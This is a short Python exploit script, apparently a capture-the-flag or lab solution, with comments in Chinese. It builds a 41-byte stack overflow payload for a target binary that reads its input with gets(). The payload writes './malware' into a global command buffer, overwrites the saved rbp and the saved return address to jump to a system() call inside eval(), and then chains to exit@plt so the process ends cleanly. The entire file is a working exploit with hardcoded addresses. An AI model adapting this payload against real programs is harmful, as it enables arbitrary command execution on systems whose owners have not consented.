#!/usr/bin/env python3
import struct
import sys

# eval() 中 "mov edi, command_buf; call system@plt" 的地址, 跳过字符串拼接直接执行命令
SYSTEM_CALL_SITE = 0x401A6B
EXIT_PLT = 0x401880          # system 返回后 eval() 的 leave; ret 落到这里, 干净退出
SAVED_RBP = 0x721000800FE8   # 指向 saved rip 那一格, leave 后 ret 从下一格取 exit@plt


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


# strcpy 会先把 "./malware" 拷进全局 command_buf,
# 再用 32 字节盖掉 expression / saved rbp / saved rip, 跳进 eval() 里 call system 的位置.
payload  = b"./malware\x00"       # 会被 strcpy 拷进全局 command_buf
payload += b"A" * 6               # 补满 16 字节的 expression[]
payload += p64(SAVED_RBP)         # 覆盖 saved rbp
payload += p64(SYSTEM_CALL_SITE)  # 覆盖 saved rip
payload += p64(EXIT_PLT)          # 放在 0x721000800ff0, eval() 的 ret 从这里取地址
payload += b"\n"                  # gets() 读到换行停止

assert len(payload) == 40 + 1     # 10 + 6 + 8 + 8 + 8 字节, 加换行
sys.stdout.buffer.write(payload)
